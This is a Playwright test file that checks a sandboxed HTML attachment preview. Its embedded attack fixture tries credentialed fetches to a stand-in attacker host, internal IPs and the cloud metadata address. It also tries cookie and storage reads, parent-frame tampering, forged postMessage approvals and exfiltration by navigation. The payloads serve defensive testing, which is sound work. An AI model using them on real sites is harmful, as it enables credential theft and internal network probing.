// SPDX-License-Identifier: AGPL-3.0-only
import { readFileSync } from 'node:fs'
import { test, expect, type Page } from '@playwright/test'
import { fixtures, mockWork } from './work-fixtures'

// Exercise the exact shipped CSP in a real isolated browser. Go integration
// tests cover the capability handler, session recheck and tenant/project RLS.
const source = readFileSync(new URL('../../internal/attachments/sandbox.go', import.meta.url), 'utf8')
const policy = /sandboxCSP\s*=\s*"([^"]+)"/.exec(source)![1]
const previewURL = `https://preview.example.net/preview/${'A'.repeat(43)}`
const attackHTML = `<!doctype html><html><body>
<button id="local" onclick="this.textContent='Working';document.body.style.height='100000px';parent.postMessage({type:'resize',height:100000,command:'approve'},'*')">Interact</button>
<a id="download" download="attack.txt" href="data:text/plain,fixture">Download attack</a>
<form id="form" action="https://attacker.example.org/form" method="post"><input name="data" value="fixture"></form>
<img src="https://attacker.example.org/image"><svg><image href="https://attacker.example.org/svg"/></svg>
<iframe src="https://attacker.example.org/child"></iframe>
<style>@import 'https://attacker.example.org/style';body{background:url('http://169.254.169.254/latest/meta-data/')}</style>
<script src="https://attacker.example.org/script"></script>
<script>
const result={};
const blocked=(name,fn)=>{try{fn();result[name]=false}catch{result[name]=true}};
blocked('parent',()=>parent.document.body.dataset.compromised='yes');
blocked('cookie',()=>document.cookie);
blocked('storage',()=>localStorage.setItem('x','y'));
const workerBlocked=new Promise(resolve=>{try{const worker=new Worker('data:text/javascript,postMessage(1)');worker.onerror=()=>{result.worker=true;resolve(true)};worker.onmessage=()=>{result.worker=false;worker.terminate();resolve(false)}}catch{result.worker=true;resolve(true)}});
blocked('serviceWorker',()=>navigator.serviceWorker.register('/sw.js'));
if(parent!==self)blocked('top',()=>top.location.href='https://attacker.example.org/top');
result.popup=window.open('https://attacker.example.org/popup')===null;
document.querySelector('#form').submit();
parent.postMessage({type:'approve',id:'att-1',command:'fetch',url:'/api/me',height:100000},'*');
Promise.all([workerBlocked,...['https://app.example.com/api/me','http://127.0.0.1:55432/','http://10.0.0.1/','http://169.254.169.254/latest/meta-data/','https://attacker.example.org/connect'].map(async url=>{try{await fetch(url,{credentials:'include'});return false}catch{return true}})]).then(blocks=>{
result.connections=blocks.every(Boolean);document.body.dataset.result=JSON.stringify(result);document.body.dataset.ready='yes';
});
</script></body></html>`

async function setup(page: Page, options: { width?: number; dark?: boolean; available?: boolean; url?: string; body?: string; expiry?: number } = {}) {
  await page.setViewportSize({ width: options.width ?? 1440, height: 900 })
  await page.emulateMedia({ colorScheme: options.dark ? 'dark' : 'light' })
  const data = fixtures()
  Object.assign(data.attachments['n-1'][0], { name: 'fragment.html', content_type: 'text/html; charset=utf-8', width: null, height: null, caption: 'Interactive fragment', thumbnail_kind: 'html-text' })
  const calls = await mockWork(page, data)
  await page.route('**/api/attachments/att-1/preview', route => route.fulfill({ json: options.available === false ? { available: false } : { available: true, url: options.url ?? previewURL, expires_at: new Date(Date.now() + (options.expiry ?? 60_000)).toISOString() }, headers: { 'Cache-Control': 'no-store' } }))
  const attempts: string[] = []
  await page.context().route(/^https?:\/\/(attacker\.example\.org|app\.example\.com|127\.0\.0\.1:55432|10\.0\.0\.1|169\.254\.169\.254)\//, route => { attempts.push(route.request().url()); return route.fulfill({ body: 'fixture', contentType: 'text/plain' }) })
  await page.context().route(previewURL, route => route.fulfill({ body: options.body ?? attackHTML, contentType: 'text/html; charset=utf-8', headers: { 'Content-Security-Policy': policy, 'Referrer-Policy': 'no-referrer', 'Cache-Control': 'no-store, private', 'X-Content-Type-Options': 'nosniff', 'Permissions-Policy': 'camera=(), microphone=(), geolocation=()' } }))
  await page.goto('/p/PHAROS/PHAROS-11')
  await page.getByRole('button', { name: /^Open Interactive fragment/ }).first().click()
  const viewer = page.locator('dialog.lightbox')
  await expect(viewer).toBeVisible()
  return { viewer, calls, attempts }
}

test('live lightbox isolates parent, credentials, APIs, active SVG and frame messages', async ({ page, context }) => {
  await context.addCookies([{ name: 'app-fixture', value: 'private', url: 'http://127.0.0.1' }])
  const { viewer, calls, attempts } = await setup(page)
  const iframe = viewer.locator('iframe.html-preview')
  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
  await expect(iframe).toHaveAttribute('referrerpolicy', 'no-referrer')
  const frame = page.frameLocator('iframe.html-preview')
  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
  const result = JSON.parse(await frame.locator('body').getAttribute('data-result') ?? '{}')
  expect(result).toEqual({ parent: true, cookie: true, storage: true, worker: true, serviceWorker: true, top: true, popup: true, connections: true })
  expect(attempts).toEqual([])
  expect(await page.locator('body').getAttribute('data-compromised')).toBeNull()
  const controls = viewer.getByRole('button', { name: 'Close viewer' })
  const box = await controls.boundingBox()
  await frame.getByRole('button', { name: 'Interact' }).click()
  await expect(frame.getByRole('button', { name: 'Working' })).toBeVisible()
  expect(await controls.boundingBox()).toEqual(box)
  expect(calls.filter(c => c.method !== 'GET' && c.path !== '/api/preferences/releases')).toEqual([])
  const downloads: string[] = []
  page.on('download', download => downloads.push(download.suggestedFilename()))
  await frame.getByRole('link', { name: 'Download attack' }).click()
  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
  expect(downloads).toEqual([])
  await controls.click()
  await expect(iframe).toHaveCount(0)
})

test('new-tab response enforces sandbox without the iframe; residual self-navigation is explicit', async ({ page, context }) => {
  await setup(page)
  const link = page.getByRole('link', { name: 'Open preview in new tab' })
  await expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  const popupPromise = context.waitForEvent('page')
  await link.click()
  const tab = await popupPromise
  await expect(tab.locator('body')).toHaveAttribute('data-ready', 'yes')
  const result = JSON.parse(await tab.locator('body').getAttribute('data-result') ?? '{}')
  expect(result.cookie).toBe(true)
  expect(result.storage).toBe(true)
  expect(result.popup).toBe(true)
  expect(result.connections).toBe(true)
  expect(await tab.evaluate(() => window.opener === null)).toBe(true)
  // This is deliberately an observed residual, not a false promise that CSP
  // forbids every network use: a direct tab can send data by navigating itself.
  let referrer: string | undefined
  await tab.route('https://attacker.example.org/residual?data=synthetic', route => { referrer = route.request().headers().referer; return route.fulfill({ body: 'Residual navigation observed', contentType: 'text/plain' }) })
  await tab.evaluate(() => { location.href = 'https://attacker.example.org/residual?data=synthetic' })
  await expect(tab).toHaveURL('https://attacker.example.org/residual?data=synthetic')
  expect(referrer).toBeUndefined()
  await tab.close()
})

test('missing/unsafe preview keeps download and refuses app-origin iframe', async ({ page }) => {
  let state = await setup(page, { available: false })
  await expect(state.viewer.getByRole('status')).toContainText('original can still be downloaded')
  await expect(state.viewer.locator('iframe')).toHaveCount(0)
  await expect(state.viewer.getByRole('link', { name: 'Download', exact: true })).toHaveAttribute('href', '/api/attachments/att-1/content?variant=original')
  await state.viewer.getByRole('button', { name: 'Close viewer' }).click()
  await page.route('**/api/attachments/att-1/preview', route => route.fulfill({ json: { available: true, url: `https://127.0.0.1/preview/${'A'.repeat(43)}`, expires_at: new Date(Date.now()+60_000).toISOString() } }))
  await page.getByRole('button', { name: /^Open Interactive fragment/ }).first().click()
  await expect(state.viewer.getByRole('status')).toContainText('unavailable')
  await expect(state.viewer.locator('iframe')).toHaveCount(0)
})

test('expiry removes active scripts and switching away discards delayed grants', async ({ page }) => {
  await page.clock.install()
  const { viewer } = await setup(page, { body: '<html><button>Local</button></html>' })
  await expect(viewer.locator('iframe')).toHaveCount(1)
  await page.clock.fastForward(60_001)
  await expect(viewer.locator('iframe')).toHaveCount(0)
  await expect(viewer.getByRole('status')).toContainText('expired')
  let release!: () => void
  const barrier = new Promise<void>(resolve => { release = resolve })
  let entered!: () => void
  const started = new Promise<void>(resolve => { entered = resolve })
  await page.route('**/api/attachments/att-1/preview', async route => { entered(); await barrier; await route.fulfill({ json: { available: true, url: previewURL, expires_at: new Date(Date.now()+60_000).toISOString() } }).catch(() => {}) })
  await viewer.getByRole('button', { name: 'Reload preview' }).click()
  await started
  await viewer.getByRole('button', { name: 'Next attachment' }).click()
  release()
  await expect(viewer.getByRole('heading', { name: 'After: compact list' })).toBeVisible()
  await expect(viewer.locator('iframe')).toHaveCount(0)
})

for (const width of [1440, 1024, 390]) for (const dark of [false, true]) {
  test(`HTML content cannot move controls at ${width}, ${dark ? 'dark' : 'light'}`, async ({ page }, testInfo) => {
    const { viewer } = await setup(page, { width, dark, body: '<html><button onclick="document.body.style.height=\'100000px\';parent.postMessage({height:100000},\'*\');this.textContent=\'Expanded\'">Expand</button></html>' })
    const close = viewer.getByRole('button', { name: 'Close viewer' })
    const download = viewer.getByRole('link', { name: 'Download fragment.html' })
    const before = await Promise.all([close.boundingBox(), download.boundingBox()])
    const frame = page.frameLocator('iframe.html-preview')
    await frame.getByRole('button', { name: 'Expand' }).click()
    await expect(frame.getByRole('button', { name: 'Expanded' })).toBeVisible()
    expect(await Promise.all([close.boundingBox(), download.boundingBox()])).toEqual(before)
    for (const box of before) { expect(box).not.toBeNull(); expect(box!.x).toBeGreaterThanOrEqual(0); expect(box!.x+box!.width).toBeLessThanOrEqual(width) }
    if (width === 390 && !dark) await page.screenshot({ path: testInfo.outputPath('html-preview-phone.png') })
  })
}
